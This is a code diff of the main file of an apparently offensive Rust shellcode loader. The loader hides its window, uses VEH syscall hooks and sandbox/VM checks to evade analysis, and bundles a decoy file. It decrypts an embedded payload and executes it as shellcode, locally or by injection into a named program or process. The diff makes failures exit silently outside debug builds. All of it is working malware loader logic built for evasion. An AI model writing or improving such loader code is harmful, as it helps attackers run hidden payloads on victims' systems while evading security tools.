@@ -1,14 +1,15 @@
-#![windows_subsystem = "windows"]
+#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
 mod utils;
 mod load_payload;
-use utils::obfuscation_noise;
 mod exec;
 mod decrypt;
 mod alloc_mem;
 mod decode;
 
-use std::process;
-use rustcrypt_ct_macros::obf_lit;
+#[cfg(feature = "debug")]
+use utils::{print_error, print_message};
+
+use utils::obfuscation_noise;
 use load_payload::load_payload;
 use decrypt::decrypt;
 use decode::decode_payload;
@@ -20,27 +21,39 @@ mod forgery;
 #[cfg(feature = "sandbox")]
 mod guard;
 
-#[cfg(feature = "veh_syscall")]
-use rust_veh_syscalls::{initialize_hooks, destroy_hooks};
-
+fn exit_program() -> ! {
+    #[cfg(feature = "veh_syscall")]
+    rust_veh_syscalls::destroy_hooks();
+    std::process::exit(1);
+}
 
 fn main() {
+    #[cfg(feature = "debug")]
+    print_message("RSL started in debug mode.");
+
     #[cfg(feature = "veh_syscall")]
-    initialize_hooks();
+    rust_veh_syscalls::initialize_hooks();
 
     #[cfg(feature = "sandbox")]
-    guard::guard_vm();
+    if guard::guard_vm() {
+        exit_program();
+    }
 
     obfuscation_noise();
 
     #[cfg(feature = "with_forgery")]
-    forgery::bundle::bundlefile();
+    if let Err(_e) = forgery::bundle::bundlefile() {        
+        #[cfg(feature = "debug")]        
+        print_error("Failed to bundle:", &_e);
+        exit_program();
+    }
     
     let encrypted_data = match load_payload() {
         Ok(data) => data,
-        Err(e) => {
-            println!("{} {}", obf_lit!("Failed:"), e);
-            process::exit(1);
+        Err(_e) => {
+            #[cfg(feature = "debug")]
+            print_error("Failed to load:", &_e);
+            exit_program();
         }
     };
 
@@ -51,18 +64,20 @@ fn main() {
     unsafe {
         let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
             Ok(p) => p,
-            Err(e) => {
-                println!("{} {}", obf_lit!("Failed to decrypt:"), e);
-                process::exit(1);
+            Err(_e) => {
+                #[cfg(feature = "debug")]
+                print_error("Failed to decrypt:", &_e);
+                exit_program();
             }
         };
         
         obfuscation_noise();
 
         #[cfg(feature = "pattern1")]
-        if let Err(e) = exec(shellcode_ptr as usize) {
-            println!("{} {}", obf_lit!("Failed to execute:"), e);
-            process::exit(1);
+        if let Err(_e) = exec(shellcode_ptr as usize) {
+            #[cfg(feature = "debug")]
+            print_error("Failed to execute:", &_e);
+            exit_program();
         }
         
         #[cfg(feature = "pattern2")] 
@@ -70,9 +85,10 @@ fn main() {
             use utils::simple_decrypt;
             let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
 
-            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, target_program.as_str()) {
-                println!("{} {}", "Failed to execute:", e);
-                process::exit(1);
+            if let Err(_e) = exec(shellcode_ptr as usize, _shellcode_len, target_program.as_str()) {
+                #[cfg(feature = "debug")]
+                print_error("Failed to execute:", &_e);
+                exit_program();
             }
         }
         
@@ -81,14 +97,13 @@ fn main() {
             use utils::simple_decrypt;
             let pid: usize = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PID")).parse().unwrap_or(0);
             
-            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
-                println!("{} {}", "Failed to execute:", e);
-                process::exit(1);
+            if let Err(_e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
+                #[cfg(feature = "debug")]
+                print_error("Failed to execute:", &_e);
+                exit_program();
             }
         }
         
     }
-
-    #[cfg(feature = "veh_syscall")]
-    destroy_hooks();
+    exit_program();
 }
